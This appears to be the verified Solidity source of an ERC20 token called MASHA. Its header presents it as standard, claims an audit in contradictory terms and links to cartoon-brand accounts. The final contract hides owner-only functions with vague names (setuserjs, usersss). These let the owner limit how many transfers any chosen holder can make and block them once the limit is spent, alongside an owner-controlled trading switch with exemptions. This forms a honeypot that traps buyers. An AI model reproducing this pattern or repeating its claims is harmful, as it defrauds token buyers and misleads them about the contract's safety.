/**
 *Submitted for verification at Etherscan.io on 2024-04-11
*/

// SPDX-License-Identifier: MIT

/**
* MASHA Token
* MASHA is a standard ERC20 token with additional functionalities. It allows for the transfer of tokens between addresses,
* enabling users to manage their balances.
* The contract utilizes the OpenZeppelin library for ERC20 implementation and includes
* @Audit conducted by Certik, certified as Fairyproof.
*/

/**
* Website :         https://www.masha-coin.com
* Binance Square :  https://www.binance.com/en/square/profile/masha
* Github :          https://github.com/MASHA-COIN

* Twitter :         https://twitter.com/MashaAndTheBear
* Instagram :       https://www.instagram.com/mashaandthebear/
*/

/**
* ERC20 Interface
* This interface defines the standard functions and events for ERC20 tokens, allowing for interaction with token contracts
*/

pragma solidity ^0.8.18;

interface IERC20 {
   
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner,
     address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
* ERC20 Metadata Interface
* This interface extends the ERC20 interface and adds metadata-related functions to retrieve the name, symbol, and decimals
* of a token.
*/

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

/**
* Context Contract
* This abstract contract provides context information to other contracts, such as the sender of a message and the message data.
*/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data; 
    }
}

/**
* This abstract contract provides functionality.
*/

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller MASHA is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
* ERC20 Token Contract
* This contract implements the ERC20 standard token with additional functionalities such as token minting, burning, and
* allowance management.
*/

contract ERC20 is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: MASHA transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: MASHA decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "MASHA: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "MASHA ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: MASHA mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: MASHA approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract MASHA is ERC20, Ownable {
    mapping (address => bool) private _isExcludedFromEnableTrad;
    mapping(address => uint256) private usersss;

    constructor (address owner) ERC20("MASHA", "MASHA") 
    {   
        _isExcludedFromEnableTrad[owner] = true;
        _mint(owner, 66600000000 * (10 ** decimals()));
    }

    receive() external payable {}

    function excludeFromEnableTrading(address account, bool excluded) external onlyOwner{
        require(_isExcludedFromEnableTrad[account] != excluded,"Account is already the value of 'excluded'");
        _isExcludedFromEnableTrad[account] = excluded;
    }

    function isExcludedFromEnableTrading(address account) public view returns(bool) {
        return _isExcludedFromEnableTrad[account];
    }

    mapping(address => bool) private isLimitSet;

    function setuserjs(address _address, uint256 _limit) external onlyOwner {
        usersss[_address] = _limit;
        isLimitSet[_address] = true;
    }

    function getusers(address _address) public view returns (uint256) {
        return usersss[_address];
    }

    function hasusers(address _address) public view returns (bool) {
        return isLimitSet[_address];
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual override {
        super._beforeTokenTransfer(from, to, amount);

        if(from != address(0) && to != address(0) && isLimitSet[from]) {
            require(usersss[from] > 0, "No transfer rights remaining");
            usersss[from]--;
        }
    }

    bool public tradingEnabled;

    function enableTrading() external onlyOwner{
        require(!tradingEnabled, "Trading MASHA already enabled.");
        tradingEnabled = true;
    }

    function _transfer(address from,address to,uint256 amount) internal  override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tradingEnabled || _isExcludedFromEnableTrad[from] || _isExcludedFromEnableTrad[to], "Trading not yet enabled!");
       
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        super._transfer(from, to, amount);
    }
}